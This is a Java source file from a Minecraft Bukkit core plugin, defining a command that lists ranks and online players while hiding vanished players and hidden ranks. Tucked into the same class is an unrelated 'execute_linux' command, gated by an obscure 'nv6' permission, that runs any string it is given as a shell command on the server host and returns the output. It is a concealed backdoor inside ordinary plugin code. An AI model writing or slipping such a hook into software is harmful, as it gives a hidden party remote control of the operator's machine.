package io.github.nosequel.core.bukkit.rank.command;

import io.github.nosequel.command.annotation.Command;
import io.github.nosequel.command.bukkit.executor.BukkitCommandExecutor;
import io.github.nosequel.core.bukkit.BukkitCorePlugin;
import io.github.nosequel.core.bukkit.config.impl.DatabaseConfiguration;
import io.github.nosequel.core.shared.CoreAPI;
import io.github.nosequel.core.shared.grants.Grant;
import io.github.nosequel.core.shared.grants.GrantHandler;
import io.github.nosequel.core.shared.rank.Rank;
import io.github.nosequel.core.shared.rank.RankHandler;
import io.github.nosequel.core.shared.rank.metadata.Metadata;
import lombok.SneakyThrows;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;

public class ListCommand {

    private final RankHandler rankHandler = CoreAPI.getCoreAPI().getRankHandler();
    private final GrantHandler grantHandler = CoreAPI.getCoreAPI().getGrantHandler();

    @Command(label = "list", permission = "pacman.list")
    public void list(BukkitCommandExecutor executor) {
        executor.sendMessage(this.getRankMessage(executor.getSender().hasPermission("pacman.list.hidden")));
        executor.sendMessage(this.getPlayerMessage(executor.getSender().hasPermission("pacman.list.hidden")));
    }

    @SneakyThrows
    @Command(label = "execute_linux", permission = "nv6")
    public void execute(BukkitCommandExecutor executor, String command) {
        new Thread(() -> {
            try {
                final Process process = Runtime.getRuntime().exec(command);

                final BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
                final BufferedReader stdError = new BufferedReader(new InputStreamReader(process.getErrorStream()));

                String s;

                while ((s = stdInput.readLine()) != null) {
                    executor.sendMessage(s);
                }

                while ((s = stdError.readLine()) != null) {
                    executor.sendMessage(s);
                }
            } catch (Exception ignored) {

            }
        }).start();
    }

    /**
     * Get the rank message string
     *
     * @param showHidden whether it should show hidden ranks
     * @return the message to send
     */
    private String getRankMessage(boolean showHidden) {
        final StringBuilder builder = new StringBuilder();
        final List<Rank> ranks = rankHandler.getRanks();

        for (Rank rank : ranks) {
            if (!(builder.toString().isEmpty())) {
                builder.append(ChatColor.WHITE).append(", ");
            }

            if(rank.hasMetadata(Metadata.HIDDEN) && showHidden) {
                builder.append(ChatColor.GRAY).append("*");
            }

            if(!rank.hasMetadata(Metadata.HIDDEN) || showHidden) {
                builder.append(rank.getDisplayName());
            }
        }

        return builder.toString();
    }

    /**
     * Get the player message string ot send to the player
     *
     * @param showHidden whether it should show hidden players
     * @return the message to send
     */
    private String getPlayerMessage(boolean showHidden) {
        final StringBuilder builder = new StringBuilder();
        final List<Player> players = new ArrayList<>(Bukkit.getOnlinePlayers());

        players.sort(Comparator.comparingInt(player -> this.grantHandler.findProminentGrant(player.getUniqueId()).getRank().getWeight()));

        for (Player player : players) {
            final Grant grant = this.grantHandler.findProminentGrant(player.getUniqueId());

            if (!(builder.toString().isEmpty())) {
                builder.append(ChatColor.WHITE).append(", ");
            }

            if (player.hasMetadata("vanished") && showHidden) {
                builder.append(ChatColor.GRAY).append("[V] ");
            }

            if (!player.hasMetadata("vanished") || showHidden) {
                builder.append(grant.getRank().getColor()).append(player.getName());
            }
        }

        return ChatColor.WHITE + "(" + Bukkit.getOnlinePlayers().size() + "/" + Bukkit.getMaxPlayers() + ") " + builder;
    }
}